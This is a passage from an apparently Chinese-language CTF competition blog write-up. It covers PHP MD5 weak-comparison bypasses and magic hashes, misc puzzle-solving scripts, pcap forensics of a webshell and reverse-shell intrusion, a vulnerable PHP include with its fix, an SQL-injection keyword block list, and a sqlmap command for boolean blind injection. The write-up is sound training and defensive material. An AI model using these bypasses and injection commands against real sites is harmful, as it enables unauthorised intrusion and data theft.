</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">QNKCDZO
</span></span><span class="line"><span class="cl">0e830400451993494058024219903391
</span></span><span class="line"><span class="cl">240610708
</span></span><span class="line"><span class="cl">0e462097431906509019562988736854
</span></span><span class="line"><span class="cl">s878926199a
</span></span><span class="line"><span class="cl">0e545993274517709034328855841020
</span></span><span class="line"><span class="cl">s155964671a
</span></span><span class="line"><span class="cl">0e342768416822451524974117254469
</span></span><span class="line"><span class="cl">s214587387a
</span></span><span class="line"><span class="cl">0e848240448830537924465865611904
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>强类型——数组绕过: <code>md5($a) === md5($b) &amp;&amp; $a !== $b</code>
<ul>
<li><code>?a[]=a&amp;b[]=b</code></li>
</ul>
</li>
<li>强类型——MD5碰撞: <code>md5($a) === md5($b) &amp;&amp; (string)$a !== (string)$b</code>
<ul>
<li><a class="link" href="https://github.com/AndSonder/fastcoll/"  target="_blank" rel="noopener"
    >fastcoll脚本仓库</a></li>
<li>同样适用于<code>md5('nmsl'.$a) === md5('nmsl'.$b)</code></li>
</ul>
</li>
<li>长度拓展攻击: 已知<code>md5(a+b)</code>和<code>len(a)</code>和<code>b</code>，可以求<code>md5(a+b+c)</code>和<code>c</code>
<ul>
<li><a class="link" href="https://github.com/miekrr/HashPump"  target="_blank" rel="noopener"
    >hashpump脚本仓库</a></li>
</ul>
</li>
<li>碰撞和拓展攻击的时候注意把不可见字符转urlencode</li>
</ul>
<h4 id="misc1">Misc1</h4>
<p>对一个文件压缩4097次。写个递归zip解压的脚本，gpt秒了。但是要小心gpt的脚本跑完一看几千个压缩包好几十G，一个里纳米。解出来摩斯密码，没意思。</p>
<h4 id="misc2">Misc2</h4>
<p>提一内存镜像，volatility一把梭，提一个docx里面是空格和tab，是snow隐写，密码是镜像里面的管理员密码。👴没见过搁这看半天8进制，血亏x2。</p>
<h4 id="misc3">Misc3</h4>
<p>给一点阵字库文件，密文就是点阵序列。出题人想让我们去字库里查，但是有没有可能可以直接打印。点阵的格式是：</p>
<ul>
<li><code>'0,0,960,1632,3120,3120,1632,960,1632,3120,3120,3120,1632,960,0,0'</code></li>
</ul>
<p>每行16个数，每个数不大于4096，也就是16位2进制，加起来就是16*16的像素点阵，我直接让gpt打印：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">lset</span><span class="p">:</span> <span class="c1"># 将数据拆分成每个数字的列表</span>
</span></span><span class="line"><span class="cl">    <span class="n">numbers</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">:</span> <span class="c1"># 将每个数字转换为二进制字符串，并在左侧补零至 16 位</span>
</span></span><span class="line"><span class="cl">        <span class="n">binary_str</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="s1">&#39;016b&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span> <span class="c1"># 打印每行的像素状态</span>
</span></span><span class="line"><span class="cl">            <span class="n">pixel</span> <span class="o">=</span> <span class="s1">&#39;X&#39;</span> <span class="k">if</span> <span class="n">binary_str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span> <span class="k">else</span> <span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">pixel</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>打出来发现只有16种字符，也就是16进制咯。肉眼写个表匹配即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">lset</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,960,1632,3120,3120,1632,960,1632,3120,3120,3120,1632,960,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;8&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,4080,4080,2096,96,192,192,384,384,768,768,768,768,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;7&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,224,96,96,96,2016,3168,3168,3168,3168,3168,2000,0,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;d&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,960,1632,3120,48,96,448,96,48,48,3120,1632,960,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,960,1632,3120,3072,3520,3680,3120,3120,3120,3120,1632,960,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;6&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,4080,3072,3072,3072,4032,3680,48,48,48,3120,1632,960,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;5&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,64,192,448,960,704,1728,3264,3264,6336,8176,192,192,480,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,992,1584,3096,3096,3096,3096,3096,3096,3096,3096,1584,992,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,128,896,384,384,384,384,384,384,384,384,384,960,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,0,0,0,0,1984,3168,96,2016,3168,3168,2008,0,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,0,0,0,0,992,3120,3072,3072,3072,3120,2016,0,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,960,1632,3120,3120,48,48,96,192,384,784,1552,4080,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,0,0,0,0,992,3120,3120,4080,3072,3120,2016,0,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,3584,1536,1536,1536,2016,1560,1560,1560,1560,1560,3056,0,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,960,1632,3120,3120,3120,3120,1648,1008,48,3120,1632,960,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;9&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;0,0,240,408,384,384,2016,384,384,384,384,384,960,0,0,0</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;f&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ll</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lset</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ans</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;cipher.txt&#39;</span> <span class="p">,</span><span class="s1">&#39;r&#39;</span> <span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">l</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ll</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span> <span class="o">+=</span> <span class="n">lset</span><span class="p">[</span><span class="n">ll</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)][</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binary_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;output_file.zip&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">binary_data</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后是个zip，压缩包密码给hint了，还是个二进制点阵，还是直接打印肉眼看。</p>
<hr>
<h3 id="初赛战报">初赛战报</h3>
<blockquote>
<p>“但是我们的球迷，他们不离不弃地陪伴着国足到最后一秒！”（递话筒）</p>
</blockquote>
<p>初赛结果是本科生战队1445分撼负研究生战队1448分，👴队压线进决赛，这下让人唠一辈子了。</p>
<p>然后第二天：</p>
<blockquote>
<ul>
<li>本科👴：组委会打电话了，👴们递补进决赛了</li>
<li>👴：¿¿¿ 复活赛打赢了？</li>
<li>牢大：我没意见</li>
</ul>
</blockquote>
<p>坏了，这下真让他给冲出来了。这下凑够人演《武汉往事》了，你们师徒三人（本科生）对阵我们师徒三人（研究生），武汉等你嗷。</p>
<h2 id="武汉往事">武汉往事</h2>
<p><img src="/p/chb2023/wangandajie.png"
	width="999"
	height="768"
	srcset="/p/chb2023/wangandajie_hu068482d5f8808e9a717474ed2b5fe6b4_889962_480x0_resize_box_3.png 480w, /p/chb2023/wangandajie_hu068482d5f8808e9a717474ed2b5fe6b4_889962_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Dell武汉了指定有你好果子吃，我就在网安大街等你"
	
	
		class="gallery-image" 
		data-flex-grow="130"
		data-flex-basis="312px"
	
></p>
<p>于是👴们来到了NCC国家网安基地，华科确实帅，宿舍/酒店确实好，食堂确实贵。</p>
<p>👴一看参赛手册，您猜怎么着，上午打一传统CTF，下午拿上午的web和pwn题打fix，还只有三轮，还是安恒平台。我只能说，不提供check down还是attack down的AWDp都是纯纯的厨生。</p>
<hr>
<h3 id="决赛wp">决赛WP</h3>
<h4 id="流量分析">流量分析</h4>
<p>还以为考misc，结果只多考了流量和逆向。👴配了一晚上环境，鸡毛没用上。👴队友也是，夜里的智慧全部木大。早知道好好睡一觉。</p>
<ol>
<li>攻击者使用的管理员账户和密码是什么
<ul>
<li><code>http.request.method == &quot;POST&quot; &amp;&amp; http.request.uri contains &quot;login&quot;</code></li>
<li>或者从后往前翻，找到执行恶意代码的地方，再往前就有了</li>
</ul>
</li>
<li>攻击者通过什么文件泄露的密码
<ul>
<li>拿到密码往前搜呗。ctrl+F，分组字节流-字符串：<code>TPShop6.0</code></li>
</ul>
</li>
<li>攻击者通过什么文件上传的后门
<ul>
<li>拿到密码往后翻，找到一个phtml的木马，再往前翻就有上传的接口</li>
</ul>
</li>
<li>攻击者将shell反弹至公网IP，反弹shell的IP和端口是什么
<ul>
<li><code>统计→IPv4 Statistics→All Adresses</code>根据分组数量排名，前两个是服务器和黑客的客户端，第三多的IP显然就是反弹的了公网IP了。</li>
<li>然后过滤tcp流，可以看到明文的bash流量，对应的端口就是了</li>
</ul>
</li>
<li>攻击者使用什么文件提权
<ul>
<li>阅读tcp流，看他执行过什么命令就行了。大不了挨个试毕竟50次机会。</li>
<li><code>sudo /bin/systemctl status apache2.service</code> 可以看到sudoer文件里提供了这条语句的免密执行，既然有sudo那就是<code>systemctl</code>了</li>
</ul>
</li>
</ol>
<p>整套题难度不高，赛场上前面的带佬基本上1小时以内ak的。👴队还是在上面浪费了点时间。导致后面web2脚本没写完，血亏x3。</p>
<h4 id="web1-1">Web1</h4>
<p>简单的文件上传CURD，过滤了php标签，但是👴直接传<code>&lt;? phpinfo();?&gt;</code>就能执行。</p>
<p>fix阶段一看，拿include读文件内容，那没事了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="c1">//list.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$dir</span> <span class="o">=</span> <span class="no">__DIR__</span><span class="o">.</span><span class="s2">&#34;/uploads/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$files</span> <span class="o">=</span> <span class="nx">array_diff</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;..&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="c1">///// 漏洞代码
</span></span></span><span class="line"><span class="cl"><span class="c1">// ob_start(); // 启动输出缓冲
</span></span></span><span class="line"><span class="cl"><span class="c1">// include &#34;$dir$filename&#34;; 
</span></span></span><span class="line"><span class="cl"><span class="c1">// $fileContent = ob_get_contents();
</span></span></span><span class="line"><span class="cl"><span class="c1">// ob_end_clean(); // 清空输出缓冲
</span></span></span><span class="line"><span class="cl"><span class="c1">///// 修复代码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$fileContent</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">!==</span> <span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filePath</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$fileSize</span> <span class="o">=</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span> <span class="c1">// 文件大小
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$fileType</span> <span class="o">=</span> <span class="nx">mime_content_type</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span> <span class="c1">// 文件类型
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$fileDetails</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;fileContent&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;data://&#39;</span><span class="o">.</span><span class="nv">$fileType</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$fileContent</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;size&#39;</span> <span class="o">=&gt;</span> <span class="nv">$fileSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="nv">$fileType</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$fileDetails</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>👴直接扬掉include，然后第一轮就宕了。👴是傻逼，光知道扬没把功能补全，血亏x4。</p>
<h4 id="web2-1">Web2</h4>
<p>sql盲注，但是fuzz了很长时间才确定。然后盲注脚本就写不完了，属于是之前学的都忘光了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_log</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 获取用户输入的搜索关键词
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$search_query</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;search_query&#34;</span><span class="p">]);</span> <span class="c1">/////// 修复大小写绕过
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$blocked_keywords</span> <span class="o">=</span> <span class="s2">&#34;/select|union|and|#|order| |by|or/&#34;</span><span class="p">;</span> <span class="c1">// 使用正则表达式定义不允许的关键字模式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$blocked_keywords</span><span class="p">,</span> <span class="nv">$search_query</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;hack!!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 连接到数据库（请根据你的数据库信息修改这些参数）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$dbhost</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$dbpass</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="s1">&#39;ctf&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nv">$conn</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;连接失败: &#39;</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$conn</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 执行数据库查询
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from images where id = &#39;</span><span class="si">$search_query</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 输出查询结果
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// echo &#34;&lt;p&gt;&#34;.$row[&#34;id&#34;].&#34;&lt;/p&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">echo</span>  <span class="s1">&#39;&lt;img src=&#34;&#39;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&#34;image_path&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34; width=&#34;200&#34; height=&#34;200&#34;&gt;&lt;br&gt;&#39;</span><span class="p">;</span> <span class="c1">// 他搁这故意迷惑👴是吧，好，那么好
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;null&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 关闭数据库连接
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>    
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这代码一眼GPT，过滤随便加点<code>strtolower()</code>和黑名单就行。</p>
<h4 id="知识点总结sqlmap进阶">知识点总结：SQLmap进阶</h4>
<p>做一名合格的高级脚本小子要学会用sqlmap的时候自己写tamper脚本。实际上也很简单，对照现成的改改就是了。</p>
<p>本题的sqlmap命令：</p>
<p><code>python3 ./sqlmap.py -u &quot;localhost/search.php&quot; -data=&quot;search_query=*&quot; --prefix &quot;1' AND&quot; --suffix &quot;AND '1'='1&quot; --technique=B --tamper=space2newline --dbs</code></p>
<ul>
<li><code>--prefix</code>, <code>--suffix</code>: 指定注入的前后缀。</li>
</ul>
<p>默认情况下，sqlmap会使用前面闭合后面注释的手法，which is dumb。比如本题中注入点后方的的LIMIT子句就需要前面的SELECT环境。而本题中所有的注释方法都不好使。</p>
<p>因此，手注的时候首先闭合出一块完整的语法环境，然后交给sqlmap。在此题中闭合的语句是：</p>
<p><code>select * from images where id = '1' AND {sub_query} AND '1'='1' LIMIT 0,1</code></p>
<ul>
<li><code>--technique=B</code>: <code>{sub_query}</code>被夹在and中间，因此作为一个布尔表达式使用布尔盲注，指定参数使sqlmap不要浪费时间进行别的测试。所有注入技术类型如下：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">B：布尔型盲注（Boolean-based blind）
</span></span><span class="line"><span class="cl">E：报错型注入（Error-based）
</span></span><span class="line"><span class="cl">U：联合查询注入（UNION query-based）
</span></span><span class="line"><span class="cl">S：堆叠查询注入（Stacked queries）
</span></span><span class="line"><span class="cl">T：时间型盲注（Time-based blind）
